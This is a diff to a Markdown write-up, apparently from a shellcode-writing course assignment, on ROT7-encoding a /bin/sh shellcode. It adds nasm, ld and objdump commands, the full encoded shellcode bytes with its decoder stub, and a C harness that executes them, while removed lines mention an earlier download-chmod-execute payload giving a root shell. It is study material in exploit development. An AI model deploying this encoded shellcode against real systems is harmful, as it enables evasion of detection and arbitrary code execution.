@@ -73,18 +73,37 @@ stage:
 	shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
 ```
 
-Let us go ahead and check if everything works as it should.
+Let's compile, link, and get the opcodes:
+
+```
+nasm -f elf32 -o a6-rot7-decode.o a6-rot7-decode.nasm
+ld -o a6-rot7-decode a6-rot7-decode.o 
+objdump -d ./a6-rot7-decode |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
+```
+
+Make an executable skeleton for the opcodes:
+
+### rot7.c
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x16\x5e\x8a\x06\x31\xc9\x8a\x5c\x0e\x01\x80\xeb\x07\x88\x1c\x0e\x41\x38\xc8\x75\xf1\xeb\x05\xe8\xe5\xff\xff\xff\x18\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87";
+
+int main()
+{
+	printf("Shellcode Length:  %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+```
+
+And finally compile, execute, and check:
 
 ![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/example.png "Example")
 
-It looks like everything works as expected. The file is correctly downloaded, chmod'ed and executed, giving us a SUID root shell.
+Looks like everything works as expected: a `/bin/sh` is spawned.
 
-Now let's go on to check how the morphed version compares to the original shellcode.
-
-![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/rot7/length.png "Shellcode length")
-
-Our morphed version is 96 bytes in length, which is of course 12 bytes shorter than the original 108 bytes. 
-
-
-
+As can be observed, the reported shellcode length is 54, which is 20 bytes shorter than the original 74. 
 
